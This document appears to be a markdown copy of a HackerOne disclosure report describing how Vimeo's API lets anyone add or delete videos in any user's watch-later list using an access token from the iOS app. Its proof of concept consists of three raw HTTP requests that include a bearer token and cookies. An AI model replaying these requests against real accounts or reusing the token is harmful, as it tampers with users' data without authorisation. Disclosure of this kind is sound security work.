@@ -1,0 +1,51 @@
+# HackerOne Report: [URGENT ISSUE] Add or Delete the videos in watch later list of any user .
+**Report ID:** 52982
+**Vulnerability Class:** Cross-Site Request Forgery (CSRF)
+
+## Vulnerability Information & PoC
+This could be done using vimeo api .I used the access token of IOS vimeo app .An attacker could remotely add and delete the videos in watchlater list of any user with out any permission of user.
+
+get the watch later list:
+GET /users/<any_user_id>/watchlater/ HTTP/1.1
+Host: api.vimeo.com
+Authorization: Bearer 675b8f568f2fe06ec89b30bab0195f95
+Accept-Encoding: gzip, deflate
+Accept: application/vnd.vimeo.*+json; version=3.3
+Cookie: __utma=18302654.1532978367.1426999777.1426999777.1426999777.1; __utmv=18302654.|3=ms=1=1; __utmz=18302654.1426999777.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); vuid=811402013.989751578
+Accept-Language: en;q=1, hi;q=0.9
+Connection: keep-alive
+Proxy-Connection: keep-alive
+User-Agent: Vimeo/1006 (iPhone; iOS 8.1.2; Scale/2.00; Version 5.2.0)
+
+post any video to watchlater list:
+
+PUT /users/<any_user_id>/watchlater/<any_video_id> HTTP/1.1
+Host: api.vimeo.com
+Authorization: Bearer 675b8f568f2fe06ec89b30bab0195f95
+Accept-Encoding: gzip, deflate
+Accept: application/vnd.vimeo.*+json; version=3.3
+Cookie: __utma=18302654.1532978367.1426999777.1426999777.1426999777.1; __utmv=18302654.|3=ms=1=1; __utmz=18302654.1426999777.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); vuid=811402013.989751578
+Accept-Language: en;q=1, hi;q=0.9
+Connection: keep-alive
+Proxy-Connection: keep-alive
+User-Agent: Vimeo/1006 (iPhone; iOS 8.1.2; Scale/2.00; Version 5.2.0)
+
+delete videos from watchlater list
+DELETE /users/<any_user_id>/watchlater/<any_video_id> HTTP/1.1
+Host: api.vimeo.com
+Authorization: Bearer 675b8f568f2fe06ec89b30bab0195f95
+Accept-Encoding: gzip, deflate
+Accept: application/vnd.vimeo.*+json; version=3.3
+Cookie: __utma=18302654.1532978367.1426999777.1426999777.1426999777.1; __utmv=18302654.|3=ms=1=1; __utmz=18302654.1426999777.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); vuid=811402013.989751578
+Accept-Language: en;q=1, hi;q=0.9
+Connection: keep-alive
+Proxy-Connection: keep-alive
+User-Agent: Vimeo/1006 (iPhone; iOS 8.1.2; Scale/2.00; Version 5.2.0)
+
+above dump can be used for proof of concept .fix this issue asap.
+
+I will message the proof of concept as a video
+
+
+
+## Discussion & Remediation Timeline
